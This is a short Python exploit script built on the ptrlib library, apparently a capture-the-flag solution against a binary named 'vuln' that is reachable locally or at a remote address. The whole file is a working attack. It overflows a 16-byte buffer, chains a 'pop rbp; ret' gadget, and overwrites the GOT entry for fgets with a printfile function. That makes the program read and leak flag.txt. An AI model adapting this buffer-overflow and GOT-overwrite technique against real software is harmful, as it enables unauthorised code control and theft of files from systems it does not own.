#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./vuln")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "94.237.60.228:46774"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    fgets_got = unwrap(exe.got("fgets"))
    main = unwrap(exe.symbol("main"))
    printfile = unwrap(exe.symbol("printfile"))

    pl = b"A" * 16
    pl += ptr.p64(next(exe.gadget("pop rbp; ret;")))
    pl += ptr.p64(fgets_got + 8)
    pl += ptr.p64(main + 12)

    io.sendline(pl)

    pl2 = []
    pl2.append(ptr.p64(printfile))  # fgets -> printfile
    pl2.append(b"A" * 8)  # will be address of flag.txt
    pl2.append(ptr.p64(main + 12))
    pl2.append(b"flag.txt")
    pl2[1] = ptr.p64(fgets_got + 8 * len(pl2))
    pl2.append(ptr.p64(0))

    io.sendline(b"".join(pl2))

    io.recvuntil("ictf")
    ptr.logger.info(f'flag: ictf{io.recvuntil("}").decode()}')

    return


if __name__ == "__main__":
    main()
